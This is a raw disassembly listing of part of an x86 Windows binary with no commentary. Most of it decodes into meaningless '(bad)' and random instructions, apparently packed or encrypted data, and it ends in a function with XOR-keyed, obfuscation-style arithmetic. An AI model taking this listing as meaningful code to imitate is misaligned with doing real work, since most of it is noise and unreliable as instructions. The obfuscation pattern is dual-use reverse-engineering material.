  415dc0:	sbb    BYTE PTR [esp+ebx*8+0x7f],0x4c
  415dc5:	(bad)  
  415dc6:	out    dx,eax
  415dc7:	arpl   WORD PTR [ecx-0x17],dx
  415dca:	dec    ebx
  415dcb:	mov    dh,0xd9
  415dcd:	dec    edx
  415dce:	lahf   
  415dcf:	pop    edi
  415dd0:	mov    ds:0xb70fd134,eax
  415dd5:	aaa    
  415dd6:	sbb    ecx,DWORD PTR [edi+0x43d6d9aa]
  415ddc:	pop    eax
  415ddd:	adc    BYTE PTR [edx-0xe],al
  415de0:	mov    edx,DWORD PTR [ecx]
  415de2:	shr    cl,0xe9
  415de5:	push   ebp
  415de6:	dec    eax
  415de7:	xor    al,0xdd
  415de9:	push   ebp
  415dea:	call   0x686c5be2
  415def:	xor    DWORD PTR [ebx],ebx
  415df1:	nop
  415df2:	mov    dh,0x37
  415df4:	(bad)  
  415df5:	fwait
  415df6:	xor    eax,0x8c2e761d
  415dfb:	mov    al,0x78
  415dfd:	xchg   edx,ebx
  415dff:	ja     0x415dd6
  415e01:	in     al,dx
  415e02:	fiadd  DWORD PTR [edx+0x43679245]
  415e08:	(bad)
  415e0b:	jo     0x415dd8
  415e0d:	imul   ebp,edx,0xf4ca1c55
  415e13:	jge    0x415dc5
  415e15:	mov    ebx,DWORD PTR [edi+0x16d87e0a]
  415e1b:	dec    eax
  415e1c:	dec    ebp
  415e1d:	and    eax,0x64dc6afd
  415e22:	jl     0x415e39
  415e24:	jns    0x415ea4
  415e26:	jns    0x415e31
  415e28:	loop   0x415e8e
  415e2a:	ins    BYTE PTR es:[edi],dx
  415e2b:	(bad)  
  415e2d:	cs pushf 
  415e2f:	push   ecx
  415e30:	loopne 0x415e79
  415e32:	inc    ecx
  415e33:	jo     0x415e0a
  415e35:	cli    
  415e36:	add    ecx,DWORD PTR [ebx]
  415e38:	les    esi,FWORD PTR [edi+ebx*2-0x54]
  415e3c:	xor    esi,DWORD PTR [edi+eax*8]
  415e3f:	sbb    BYTE PTR [esi],al
  415e41:	adc    eax,0xfb755420
  415e46:	or     dl,ch
  415e48:	dec    esi
  415e49:	out    dx,eax
  415e4a:	sbb    eax,0xfc3a5cc4
  415e4f:	pop    ecx
  415e50:	inc    ecx
  415e51:	cmc    
  415e52:	mov    BYTE PTR [edx],0xac
  415e55:	jo     0x415eb1
  415e57:	inc    esp
  415e58:	xchg   esi,eax
  415e59:	sbb    eax,0x26e765c7
  415e5e:	add    edx,DWORD PTR ds:0xa4424c02
  415e64:	sbb    BYTE PTR [edx],al
  415e66:	popf   
  415e67:	pop    eax
  415e68:	or     eax,0x17722703
  415e6d:	sub    eax,0xe937f41a
  415e72:	out    0xba,al
  415e74:	retf   
  415e75:	xchg   edx,eax
  415e76:	jp     0x415e22
  415e78:	shl    BYTE PTR cs:[edi-0x3e3c6efd],cl
  415e7f:	cwde   
  415e80:	xor    DWORD PTR [eax-0x20],esi
  415e83:	and    al,0xdc
  415e85:	inc    edi
  415e86:	pop    ss
  415e87:	sub    eax,0xfa49951
  415e8c:	imul   DWORD PTR [edi+edi*2-0x5f]
  415e90:	pop    esi
  415e91:	fs pop es
  415e93:	cwde   
  415e94:	cs ds stc 
  415e97:	test   dl,al
  415e99:	jb     0x415f02
  415e9b:	xor    esp,DWORD PTR [ebx-0x6a49b7db]
  415ea1:	mov    ebx,0x64e8529b
  415ea6:	xchg   ebx,eax
  415ea7:	push   ecx
  415ea8:	xor    DWORD PTR [edx+0xd],edi
  415eab:	sbb    ecx,DWORD PTR [edi-0x5]
  415eae:	pop    esp
  415eaf:	or     BYTE PTR [edx],ch
  415eb1:	ror    BYTE PTR [ebx+0x17b3f8fe],0x9d
  415eb8:	mov    ss,WORD PTR [esi]
  415eba:	test   eax,0xe7806fe0
  415ebf:	out    0xd3,eax
  415ec1:	push   esp
  415ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ec4:	xchg   BYTE PTR [edi+0x69fcd3ad],ah
  415eca:	fidivr DWORD PTR [edx-0x55ade1d]
  415ed0:	pop    ebp
  415ed1:	pusha  
  415ed2:	jle    0x415ee1
  415ed4:	loop   0x415f23
  415ed6:	aaa    
  415ed7:	ror    DWORD PTR [ecx],cl
  415ed9:	fwait
  415eda:	repz inc edi
  415edc:	jp     0x415ee1
  415ede:	dec    edx
  415edf:	test   eax,0x6efbea24
  415ee4:	adc    BYTE PTR [eax+0x34e1d852],dl
  415eea:	icebp  
  415eeb:	loop   0x415f57
  415eed:	lea    ebp,[esi+0x2]
  415ef0:	xor    eax,DWORD PTR [ecx-0x48]
  415ef3:	outs   dx,BYTE PTR ds:[esi]
  415ef4:	jp     0x415ee1
  415ef6:	daa    
  415ef7:	push   0x3cebf375
  415efc:	xor    DWORD PTR [ebp+0x716154a7],ebp
  415f02:	leave  
  415f03:	or     dh,ch
  415f05:	lea    esp,[ecx]
  415f07:	retf   0x90f9
  415f0a:	sbb    BYTE PTR [edx-0x7234c34d],dh
  415f10:	xchg   ebx,eax
  415f11:	push   edi
  415f12:	in     eax,0x78
  415f14:	sub    al,0x8f
  415f16:	cmc    
  415f17:	cmp    al,0x2
  415f19:	push   esi
  415f1a:	adc    eax,0xcebe265f
  415f1f:	in     al,0x54
  415f21:	fstp   DWORD PTR [ebp-0x1]
  415f24:	daa    
  415f25:	sbb    al,0xb6
  415f27:	mov    al,BYTE PTR [ecx-0x3420524c]
  415f2d:	mov    ah,0x1
  415f2f:	imul   eax,DWORD PTR [esi],0x18
  415f32:	inc    esp
  415f33:	not    BYTE PTR [ebx-0x4a13ec20]
  415f39:	mov    dh,0x3a
  415f3b:	inc    esp
  415f3c:	mov    eax,ds:0xd8c51a60
  415f41:	mov    al,BYTE PTR ds:0x8d584d31
  415f47:	dec    ebx
  415f48:	dec    edi
  415f49:	mov    eax,0x5925628e
  415f4e:	retf   0x3bee
  415f51:	xchg   BYTE PTR [ebp+0x46],dl
  415f54:	out    0x5f,eax
  415f56:	xchg   esi,eax
  415f57:	or     BYTE PTR [ebx+0x26],bh
  415f5a:	stos   BYTE PTR es:[edi],al
  415f5b:	repz mov ah,0x44
  415f5e:	jo     0x415fa6
  415f60:	mov    ebx,0xba08e4bf
  415f65:	inc    ebx
  415f66:	sub    al,0xac
  415f68:	dec    ecx
  415f69:	clc    
  415f6a:	pop    es
  415f6b:	test   eax,0xcebbf2
  415f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f71:	sahf   
  415f72:	dec    BYTE PTR [edi-0x27]
  415f75:	mov    eax,ds:0x9c77a464
  415f7a:	cmp    edi,ecx
  415f7c:	jle    0x415f7b
  415f7e:	pop    es
  415f7f:	pop    eax
  415f80:	push   DWORD PTR [ebx-0x3f8e7092]
  415f86:	xchg   edi,eax
  415f87:	aam    0xbc
  415f89:	dec    edx
  415f8a:	outs   dx,BYTE PTR ds:[esi]
  415f8b:	sbb    al,0x3f
  415f8d:	adc    ch,dl
  415f8f:	push   0x13
  415f91:	sbb    BYTE PTR [ecx-0x1bb1706],ah
  415f97:	push   ebp
  415f98:	aam    0xe8
  415f9a:	mov    ch,0x55
  415f9c:	jge    0x415fa7
  415f9e:	stc    
  415f9f:	pop    ss
  415fa0:	mov    edi,0x93dfbc78
  415fa5:	into   
  415fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fa7:	call   0x7d5a625e
  415fac:	jmp    0x2e890dcc
  415fb1:	test   al,0x24
  415fb3:	or     cl,BYTE PTR [esi]
  415fb5:	pop    edi
  415fb6:	stos   DWORD PTR es:[edi],eax
  415fb7:	out    0xd1,al
  415fb9:	pop    es
  415fba:	int    0xa5
  415fbc:	(bad)  
  415fbd:	xchg   ebx,eax
  415fbe:	xchg   edi,eax
  415fbf:	cli    
  415fc0:	daa    
  415fc1:	jno    0x416013
  415fc3:	lea    ecx,[ebx]
  415fc5:	fcom   QWORD PTR [ebx]
  415fc7:	psubd  mm4,QWORD PTR [esi+0xc040034]
  415fce:	pop    ebx
  415fcf:	sbb    cl,BYTE PTR [eax]
  415fd1:	aad    0x5e
  415fd3:	or     dl,BYTE PTR [ebx+0x26]
  415fd6:	sub    al,bh
  415fd8:	pop    esi
  415fd9:	sub    BYTE PTR [edi],0xab
  415fdc:	lock inc ebx
  415fde:	xchg   edi,eax
  415fdf:	and    al,0x61
  415fe1:	mov    cl,0x8d
  415fe3:	fcomp  DWORD PTR [esi]
  415fe5:	ja     0x416001
  415fe7:	add    ebx,ecx
  415fe9:	adc    ebp,DWORD PTR [edi+0x76]
  415fec:	pop    esi
  415fed:	fdivr  DWORD PTR [ebx-0x338ea121]
  415ff3:	(bad)  
  415ff5:	out    dx,al
  415ff6:	jb     0x415fe8
  415ff8:	in     al,dx
  415ff9:	int    0x5
  415ffb:	fidivr DWORD PTR [eax-0x7cc4201a]
  416001:	sub    al,0xf
  416003:	sub    ebx,DWORD PTR [edi]
  416005:	jle    0x41600a
  416007:	push   ecx
  416008:	call   0x7f3d:0xfb30daf5
  41600f:	push   ds
  416010:	lahf   
  416011:	or     BYTE PTR [eax-0xb],ch
  416014:	aas    
  416015:	rcl    BYTE PTR [edx],0x4c
  416018:	enter  0x9390,0x24
  41601c:	(bad)  
  41601d:	push   0xff706468
  416022:	add    eax,0x49d2beb9
  416027:	xchg   DWORD PTR [ebx-0x10],ecx
  41602a:	jmp    0x415fb4
  41602c:	push   es
  41602d:	mov    BYTE PTR [ebx+0x10],bl
  416030:	cmp    BYTE PTR [eax+0x4fbcef97],bh
  416036:	jo     0x41607c
  416038:	mov    dh,0xd8
  41603a:	clc    
  41603b:	dec    ecx
  41603c:	cs jmp 0x415fbf
  41603f:	imul   edi,DWORD PTR [ebp-0x46],0x56dada8d
  416046:	cdq    
  416047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416048:	cmp    esi,DWORD PTR [edx+0x7705f229]
  41604e:	imul   ecx,DWORD PTR [ecx-0x4781a4d5],0xdef16dac
  416058:	jnp    0x416069
  41605a:	repnz push ebp
  41605c:	outs   dx,BYTE PTR ds:[esi]
  41605d:	or     al,0x57
  41605f:	inc    eax
  416060:	mov    eax,ds:0x498a2383
  416065:	out    0x96,eax
  416067:	mov    esp,0xd1a5e5bf
  41606c:	adc    eax,0x2c882893
  416071:	pushf  
  416072:	imul   edi,DWORD PTR [ebx+0x1],0x40b7d560
  416079:	sub    al,0x3c
  41607b:	in     al,dx
  41607c:	sub    dl,bl
  41607e:	int3   
  41607f:	push   ecx
  416080:	mov    bl,bl
  416082:	push   ds
  416083:	popf   
  416084:	dec    edx
  416085:	push   ebp
  416086:	adc    al,0xfe
  416088:	dec    ecx
  416089:	arpl   WORD PTR [ecx+0x5],sp
  41608c:	mov    edx,DWORD PTR [ecx+0x1a]
  41608f:	sub    edx,DWORD PTR [ebx]
  416091:	repnz lods al,BYTE PTR ds:[esi]
  416093:	cmp    DWORD PTR [ebp+0x6a8b8d6d],eax
  416099:	std    
  41609a:	lods   al,BYTE PTR ds:[esi]
  41609b:	xchg   edx,eax
  41609c:	mov    gs,edx
  41609e:	nop
  41609f:	shl    ah,cl
  4160a1:	loope  0x4160c5
  4160a3:	rcl    DWORD PTR [eax-0x3c8cb6a4],0xb1
  4160aa:	outs   dx,BYTE PTR ds:[esi]
  4160ab:	and    BYTE PTR [ebp+edx*1-0x5d374e2],cl
  4160b2:	ret    
  4160b3:	jo     0x4160c4
  4160b5:	icebp  
  4160b6:	inc    esi
  4160b7:	sub    cl,BYTE PTR [ebx]
  4160b9:	jge    0x4160e1
  4160bb:	jmp    0x7e21:0xafc5286b
  4160c2:	es pop ebp
  4160c4:	sub    eax,0xac2e172
  4160c9:	dec    ebp
  4160ca:	imul   esi,DWORD PTR cs:[ecx],0x4
  4160ce:	jl     0x416112
  4160d0:	add    eax,0x306d4590
  4160d5:	out    dx,eax
  4160d6:	fnstsw ax
  4160d8:	push   edi
  4160d9:	rcr    BYTE PTR [eax],1
  4160db:	out    dx,eax
  4160dc:	lods   eax,DWORD PTR ds:[esi]
  4160dd:	int    0x4e
  4160df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160e0:	inc    ecx
  4160e1:	cs push ecx
  4160e3:	adc    esp,edi
  4160e5:	loopne 0x416166
  4160e7:	iret   
  4160e8:	arpl   sp,sp
  4160ea:	xchg   ebx,eax
  4160eb:	sub    DWORD PTR [edx],ecx
  4160ed:	stos   BYTE PTR es:[edi],al
  4160ee:	adc    al,0x8c
  4160f0:	mov    ebx,0x9c7880b0
  4160f5:	and    ebp,DWORD PTR [ebp+0x37e5c526]
  4160fb:	xor    edx,DWORD PTR [eax*8-0x534a8e8]
  416102:	aad    0xec
  416104:	inc    ebx
  416105:	daa    
  416106:	inc    eax
  416107:	mov    ebp,edi
  416109:	dec    edx
  41610a:	xor    BYTE PTR [eax+0x51acfb58],bh
  416110:	scas   eax,DWORD PTR es:[edi]
  416111:	pop    ds
  416112:	xor    al,0x23
  416114:	mov    bl,0xc4
  416116:	pop    ebp
  416117:	jnp    0x416191
  416119:	je     0x4160d5
  41611b:	aad    0x84
  41611d:	mov    DWORD PTR [edx],esi
  41611f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416120:	jo     0x41613f
  416122:	cmp    ebp,eax
  416124:	jno    0x4160e9
  416126:	nop
  416127:	arpl   WORD PTR [esi+ecx*1+0x45],dx
  41612b:	mov    DWORD PTR [edi+0x6e],edx
  41612e:	stos   DWORD PTR es:[edi],eax
  41612f:	retf   0x7528
  416132:	pop    esp
  416133:	inc    esi
  416134:	pusha  
  416135:	jns    0x41619e
  416137:	cmp    edx,DWORD PTR [esi]
  416139:	aam    0x97
  41613b:	cmp    al,0xbb
  41613d:	fwait
  41613e:	xchg   ebx,eax
  41613f:	(bad)  
  416140:	js     0x416196
  416142:	push   ebx
  416143:	xchg   ebx,eax
  416144:	into   
  416145:	ds push ebp
  416147:	push   ds
  416148:	xchg   esp,eax
  416149:	cwde   
  41614a:	and    eax,0xff7705c2
  41614f:	(bad)  [ebx+0x2614811e]
  416155:	and    dl,ah
  416157:	mov    ebx,0x902b8a69
  41615c:	sahf   
  41615d:	xchg   esp,eax
  41615e:	push   edx
  41615f:	imul   esp
  416161:	inc    edi
  416162:	and    BYTE PTR [ebx+0x41],bh
  416165:	popf   
  416166:	jo     0x416123
  416168:	out    0xe1,eax
  41616a:	(bad)  
  41616b:	in     eax,dx
  41616c:	je     0x416174
  41616e:	inc    esi
  41616f:	inc    ebx
  416170:	mov    eax,ds:0xaf32de86
  416175:	ror    ebx,1
  416177:	adc    eax,0xa782966e
  41617c:	push   edx
  41617d:	mov    esi,0xae2759e8
  416182:	jae    0x4161c5
  416184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416185:	gs (bad) 
  416187:	jp     0x416132
  416189:	mov    esp,0x26aeb0b3
  41618e:	sub    bh,al
  416190:	pop    ebx
  416191:	psrad  mm6,QWORD PTR [esi+0x6311e861]
  416198:	mov    ah,0xf2
  41619a:	xchg   edi,eax
  41619b:	inc    edi
  41619c:	sbb    ah,BYTE PTR [eax+0x2c67591]
  4161a2:	idiv   DWORD PTR [ecx+eax*4-0xc]
  4161a6:	mov    al,0x9
  4161a8:	sar    edi,cl
  4161aa:	lods   eax,DWORD PTR ds:[esi]
  4161ab:	lods   eax,DWORD PTR ds:[esi]
  4161ac:	mov    fs,WORD PTR [edi-0x71]
  4161af:	ja     0x4161bd
  4161b1:	aam    0x94
  4161b3:	aam    0x82
  4161b5:	add    al,0xf1
  4161b7:	jns    0x41615c
  4161b9:	jns    0x416191
  4161bb:	fild   WORD PTR [ebp+edx*4-0x5b0558d0]
  4161c2:	xchg   esp,eax
  4161c3:	pushf  
  4161c4:	lock sbb eax,0xd4fb3cb1
  4161ca:	retf   0x78cb
  4161cd:	xor    BYTE PTR [ecx],dh
  4161cf:	mov    ecx,0xc3891a42
  4161d4:	stos   BYTE PTR es:[edi],al
  4161d5:	std    
  4161d6:	mov    DWORD PTR ds:0xd3057892,edi
  4161dc:	mov    cl,0xa2
  4161de:	sbb    DWORD PTR [eax+ebx*1+0x29],edx
  4161e2:	les    ecx,FWORD PTR [edi]
  4161e4:	inc    eax
  4161e5:	test   BYTE PTR [ebx+0x68d8c8f7],dl
  4161eb:	mov    cl,0x71
  4161ed:	xchg   ebp,eax
  4161ee:	mov    es,edx
  4161f0:	pop    esi
  4161f1:	and    al,0x90
  4161f3:	out    0xc5,eax
  4161f5:	fld    QWORD PTR [esi]
  4161f7:	stos   BYTE PTR es:[edi],al
  4161f8:	inc    ecx
  4161f9:	add    esi,eax
  4161fb:	fsubr  QWORD PTR [edi-0x64]
  4161fe:	sahf   
  4161ff:	inc    ebx
  416200:	popf   
  416201:	cs arpl WORD PTR ds:[eax-0x432c7a9],bp
  416209:	mov    ds:0x97857b40,al
  41620e:	lods   eax,DWORD PTR ds:[esi]
  41620f:	and    al,0x89
  416211:	or     esp,edx
  416213:	stos   DWORD PTR es:[edi],eax
  416214:	add    al,0xf7
  416216:	pop    edi
  416217:	popf   
  416218:	lahf   
  416219:	ret    0xa2c6
  41621c:	stos   DWORD PTR es:[edi],eax
  41621d:	mov    ds:0x421c690a,eax
  416222:	fwait
  416223:	and    BYTE PTR [ebp+0x6f],ch
  416226:	adc    al,0xeb
  416228:	cwde   
  416229:	xor    esp,edi
  41622b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41622c:	lahf   
  41622d:	xchg   edx,eax
  41622e:	mov    edx,0x652bba1a
  416233:	int3   
  416234:	cmp    eax,0x347fecbd
  416239:	pop    ebx
  41623a:	sub    BYTE PTR [eax+0x21],ah
  41623d:	fs jo  0x416273
  416240:	ja     0x416205
  416242:	sbb    BYTE PTR [ebp+0x50],cl
  416245:	xchg   ecx,eax
  416246:	(bad)  
  416247:	fnstenv [edx]
  416249:	mov    bh,0xb7
  41624b:	arpl   si,di
  41624d:	add    bh,BYTE PTR es:[edi]
  416250:	adc    al,0x25
  416252:	lock in al,dx
  416254:	shl    BYTE PTR [ebx-0x712cd043],cl
  41625a:	adc    ah,BYTE PTR [ecx-0xd24d052]
  416260:	push   ebx
  416261:	push   cs
  416262:	push   ebx
  416263:	push   edi
  416264:	aas    
  416265:	lea    eax,[edx-0x1718a0c2]
  41626b:	pop    ds
  41626c:	inc    edi
  41626d:	shl    BYTE PTR [eax+edi*1+0x7a],cl
  416271:	sbb    al,bh
  416273:	stos   DWORD PTR es:[edi],eax
  416274:	inc    ecx
  416275:	scas   eax,DWORD PTR es:[edi]
  416276:	dec    ebp
  416277:	fld    DWORD PTR [edx]
  416279:	inc    ebx
  41627a:	nop
  41627b:	adc    BYTE PTR [ecx+0x68],al
  41627e:	dec    ecx
  41627f:	jge    0x4162fe
  416281:	shr    ebx,0xd9
  416284:	add    eax,0x191d32e5
  416289:	fimul  DWORD PTR [eax]
  41628b:	push   0x5
  41628d:	push   edi
  41628e:	xchg   edi,eax
  41628f:	loop   0x41624e
  416291:	aaa    
  416292:	xchg   edi,eax
  416293:	xlat   BYTE PTR ds:[ebx]
  416294:	push   esp
  416295:	sub    al,0xcf
  416297:	mov    BYTE PTR [ebx+0x219034e6],ch
  41629d:	stos   DWORD PTR es:[edi],eax
  41629e:	push   ss
  41629f:	xor    edx,ebp
  4162a1:	in     al,dx
  4162a2:	sub    edi,edi
  4162a4:	cwde   
  4162a5:	adc    dh,BYTE PTR [ecx-0x21]
  4162a8:	add    ah,ah
  4162aa:	sub    DWORD PTR [eax+0x747f9578],0x61afe7b6
  4162b4:	push   esp
  4162b5:	iret   
  4162b6:	pop    esi
  4162b7:	aas    
  4162b8:	xlat   BYTE PTR ds:[ebx]
  4162b9:	in     al,dx
  4162ba:	ds push ss
  4162bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162bd:	add    al,0xfa
  4162bf:	mov    ebp,0x640977be
  4162c4:	add    ch,BYTE PTR [eax+0x659a431f]
  4162ca:	inc    esi
  4162cb:	into   
  4162cc:	ins    DWORD PTR es:[edi],dx
  4162cd:	or     DWORD PTR [ebp+edx*8+0x61bb9998],esi
  4162d4:	int3   
  4162d5:	(bad)  
  4162d6:	retf   
  4162d7:	stc    
  4162d8:	cmc    
  4162d9:	mov    edi,0xddedf931
  4162de:	iret   
  4162df:	stos   DWORD PTR es:[edi],eax
  4162e0:	and    al,dh
  4162e2:	add    bh,BYTE PTR [edx-0x2247e281]
  4162e8:	leave  
  4162e9:	inc    ecx
  4162ea:	lds    esi,FWORD PTR [ecx-0x71acb0db]
  4162f0:	imul   BYTE PTR [esi-0x756ed2f8]
  4162f6:	dec    ebp
  4162f7:	push   ebp
  4162f8:	int3   
  4162f9:	fild   QWORD PTR [eax-0x15]
  4162fc:	sub    DWORD PTR [eax+0x64],ebp
  4162ff:	test   al,0xcc
  416301:	sub    DWORD PTR [edx+0x2a],esi
  416304:	js     0x41629b
  416306:	(bad)  
  416307:	push   edx
  416308:	jle    0x416343
  41630a:	lods   al,BYTE PTR ds:[esi]
  41630b:	xchg   esp,eax
  41630c:	sbb    esp,edx
  41630e:	and    BYTE PTR [ebp+0x1de5f96e],al
  416314:	adc    edi,DWORD PTR [ebx+0x7]
  416317:	add    BYTE PTR [esi],0x52
  41631a:	repnz retf 0x8eec
  41631e:	add    eax,DWORD PTR [edi]
  416320:	icebp  
  416321:	imul   ecx,DWORD PTR [edi+0x5b],0xffffffaa
  416325:	lahf   
  416326:	mov    dl,0x1c
  416328:	cmp    eax,0x35180ad4
  41632d:	jnp    0x4162df
  41632f:	push   0x4de92340
  416334:	pop    ss
  416335:	imul   edi
  416337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416338:	mov    eax,0xeb4fe407
  41633d:	mov    edx,cs
  41633f:	jge    0x416303
  416341:	sub    al,0x85
  416343:	fmul   DWORD PTR [ecx]
  416345:	int    0x5d
  416347:	pop    eax
  416348:	int    0xd0
  41634a:	or     dl,al
  41634c:	sub    esi,DWORD PTR [ebp+ebx*2-0x44509c8c]
  416353:	ret    0x6b2b
  416356:	mov    bl,0xd0
  416358:	std    
  416359:	xchg   ebp,eax
  41635a:	lods   eax,DWORD PTR ds:[esi]
  41635b:	scas   al,BYTE PTR es:[edi]
  41635c:	and    al,0x98
  41635e:	shr    BYTE PTR [edx],1
  416360:	cmp    ebx,DWORD PTR [edi+ecx*8-0x1d49438c]
  416367:	in     al,dx
  416368:	and    al,0x79
  41636a:	enter  0x2cc9,0x37
  41636e:	in     al,0x78
  416370:	nop
  416371:	xchg   BYTE PTR [ebx-0x437c11d9],cl
  416377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416378:	lods   al,BYTE PTR ds:[esi]
  416379:	mov    ecx,0x1635ae8b
  41637e:	mov    al,ds:0x95ab3d8c
  416383:	div    BYTE PTR [esi+0x5d]
  416386:	xchg   esi,eax
  416387:	cli    
  416388:	and    esp,DWORD PTR [ecx+0x2b]
  41638b:	pop    esp
  41638c:	push   edx
  41638d:	(bad)  
  41638e:	lods   al,BYTE PTR ds:[esi]
  41638f:	iret   
  416390:	scas   eax,DWORD PTR es:[edi]
  416391:	pushf  
  416392:	mov    esp,0xcf0924b1
  416397:	push   ds
  416398:	loopne 0x4163e2
  41639a:	cmp    al,0x63
  41639c:	sub    ch,ch
  41639e:	ror    BYTE PTR [ebx-0x16],0xb8
  4163a2:	iret   
  4163a3:	mov    esp,0x7acbd318
  4163a8:	fst    st(7)
  4163aa:	cmp    al,0x76
  4163ac:	sub    cl,BYTE PTR ds:0xdd10dcc9
  4163b2:	add    DWORD PTR [edx-0x25d4ca0b],eax
  4163b8:	add    ebx,DWORD PTR [ebp-0x44]
  4163bb:	mov    DWORD PTR [ebp-0x44],ebx
  4163be:	mov    edx,DWORD PTR [ebp+0x8]
  4163c1:	xor    edx,eax
  4163c3:	add    edx,esi
  4163c5:	jne    0x413f9a
  4163cb:	mov    edx,DWORD PTR [ebp-0x8]
  4163ce:	mov    ebx,DWORD PTR [ebp-0xc]
  4163d1:	xor    edx,eax
  4163d3:	lea    edx,[edx+ebx*1+0x3272e2]
  4163da:	mov    DWORD PTR [ebp-0xc],edx
  4163dd:	mov    edx,DWORD PTR [ebp-0x10]
  4163e0:	xor    edx,eax
  4163e2:	add    edx,esi
  4163e4:	jne    0x40f3d9
  4163ea:	jmp    0x416501
  4163ef:	mov    ecx,DWORD PTR [ebp-0x14]
  4163f2:	mov    DWORD PTR [ebp+0x8],ecx
  4163f5:	jmp    0x41646e
  4163fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4163fd:	mov    edx,DWORD PTR [ebp-0x8]
  416400:	xor    ecx,eax
  416402:	xor    edx,eax
  416404:	sub    ecx,edx
  416406:	sub    ecx,esi
  416408:	xor    ecx,eax
  41640a:	mov    DWORD PTR [ebp+0x8],ecx
  41640d:	mov    ecx,DWORD PTR [ebp+0x8]
  416410:	mov    edx,DWORD PTR [ebp-0x58]
  416413:	add    ecx,0x5708c4
  416419:	imul   ecx,edx
  41641c:	mov    DWORD PTR [ebp-0x58],ecx
  41641f:	mov    ecx,DWORD PTR [ebp+0x8]
  416422:	mov    edx,DWORD PTR [ebp-0x54]
  416425:	add    ecx,0x64f8da
  41642b:	or     ecx,edx
  41642d:	mov    DWORD PTR [ebp-0x54],ecx
  416430:	mov    ecx,DWORD PTR [ebp+0x8]
  416433:	mov    edx,DWORD PTR [ebp-0x50]
  416436:	add    ecx,0x242ebe9
  41643c:	xor    ecx,edx
  41643e:	mov    DWORD PTR [ebp-0x50],ecx
  416441:	mov    ecx,DWORD PTR [ebp+0x8]
  416444:	mov    edx,DWORD PTR [ebp-0x4c]
  416447:	add    ecx,edi
  416449:	and    ecx,edx
  41644b:	mov    DWORD PTR [ebp-0x4c],ecx
  41644e:	mov    ecx,DWORD PTR [ebp+0x8]
  416451:	mov    edx,DWORD PTR [ebp-0x48]
  416454:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41645b:	mov    DWORD PTR [ebp-0x48],ecx
  41645e:	mov    ecx,DWORD PTR [ebp+0x8]
  416461:	mov    edx,0xfa5e15e2
  416466:	sub    edx,ecx
  416468:	add    edx,DWORD PTR [ebp-0x44]
  41646b:	mov    DWORD PTR [ebp-0x44],edx
  41646e:	mov    ecx,DWORD PTR [ebp+0x8]
  416471:	xor    ecx,eax
  416473:	add    ecx,esi
  416475:	jne    0x4163fa
  41647b:	jmp    0x41650d
  416480:	mov    ecx,DWORD PTR [ebp+0x8]
  416483:	mov    edx,DWORD PTR [ebp-0x8]
  416486:	xor    ecx,eax
  416488:	xor    edx,eax
  41648a:	sub    ecx,edx
  41648c:	sub    ecx,esi
  41648e:	xor    ecx,eax
  416490:	mov    DWORD PTR [ebp+0x8],ecx
  416493:	mov    ecx,DWORD PTR [ebp+0x8]
  416496:	mov    edx,DWORD PTR [ebp-0x58]
  416499:	add    ecx,0x5708c4
  41649f:	imul   ecx,edx
  4164a2:	mov    DWORD PTR [ebp-0x58],ecx
  4164a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4164a8:	mov    edx,DWORD PTR [ebp-0x54]
  4164ab:	add    ecx,0x64f8da
  4164b1:	or     ecx,edx
  4164b3:	mov    DWORD PTR [ebp-0x54],ecx
  4164b6:	mov    ecx,DWORD PTR [ebp+0x8]
  4164b9:	mov    edx,DWORD PTR [ebp-0x50]
  4164bc:	add    ecx,0x242ebe9
  4164c2:	xor    ecx,edx
  4164c4:	mov    DWORD PTR [ebp-0x50],ecx
  4164c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4164ca:	mov    edx,DWORD PTR [ebp-0x4c]
  4164cd:	add    ecx,edi
  4164cf:	and    ecx,edx
  4164d1:	mov    DWORD PTR [ebp-0x4c],ecx
  4164d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164d7:	mov    edx,DWORD PTR [ebp-0x48]
  4164da:	lea    ecx,[edx+ecx*1+0x241fc1f]
  4164e1:	mov    DWORD PTR [ebp-0x48],ecx
  4164e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164e7:	mov    edx,0xfa5e15e2
  4164ec:	sub    edx,ecx
  4164ee:	add    edx,DWORD PTR [ebp-0x44]
  4164f1:	mov    DWORD PTR [ebp-0x44],edx
  4164f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164f7:	xor    ecx,eax
  4164f9:	add    ecx,esi
  4164fb:	jne    0x416480
  416501:	mov    ecx,DWORD PTR [ebp-0x8]
  416504:	xor    ecx,eax
  416506:	mov    eax,DWORD PTR [ebp+0x10]
  416509:	add    ecx,esi
  41650b:	mov    DWORD PTR [eax],ecx
  41650d:	pop    edi
  41650e:	pop    esi
  41650f:	pop    ebx
  416510:	leave  
  416511:	ret    0xc
  416514:	add    BYTE PTR [eax+0x43],al
  416517:	add    BYTE PTR [eax+eax*2],al
  41651a:	inc    ebx
  41651b:	add    BYTE PTR [eax],cl
  41651d:	inc    eax
  41651e:	inc    ebx
  41651f:	add    BYTE PTR [eax+eax*2],cl
  416522:	inc    ebx
  416523:	add    BYTE PTR [eax],dl
  416525:	inc    eax
  416526:	inc    ebx
  416527:	add    BYTE PTR [eax+eax*2],dl
  41652a:	inc    ebx
  41652b:	add    BYTE PTR [eax],bl
  41652d:	inc    eax
  41652e:	inc    ebx
  41652f:	add    BYTE PTR [eax+eax*2],bl
  416532:	inc    ebx
  416533:	add    BYTE PTR [eax],ah
  416535:	inc    eax
  416536:	inc    ebx
  416537:	add    BYTE PTR [eax+eax*2],ah
  41653a:	inc    ebx
  41653b:	add    BYTE PTR [eax],ch
  41653d:	inc    eax
  41653e:	inc    ebx
